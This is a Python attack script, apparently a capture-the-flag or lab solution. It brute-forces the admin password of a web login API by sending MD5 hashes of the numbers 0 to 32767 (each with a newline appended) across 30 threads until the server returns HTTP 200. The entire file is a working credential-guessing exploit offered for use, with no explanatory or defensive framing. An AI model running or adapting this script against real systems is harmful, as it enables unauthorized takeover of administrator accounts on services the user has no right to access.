import requests
from hashlib import md5
from argparse import ArgumentParser as ap
import concurrent.futures


def do_req(args, password):

    data = {
        "username": "admin",
        "password": password,
    }

    req = requests.post(f"http://{args.ip}:{args.port}/api/login", json=data)

    if req.status_code == 200:
        print("Found password: ", password)
        raise SystemExit

def main():

    parser = ap()
    parser.add_argument("ip", type=str)
    parser.add_argument("port", type=int)
    args = parser.parse_args()

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        for i in range(0,32768):
            h = md5(str(i).encode() + b'\n')
            password = h.hexdigest()

            executor.submit(do_req, args, password)

if __name__ == "__main__":
    main()


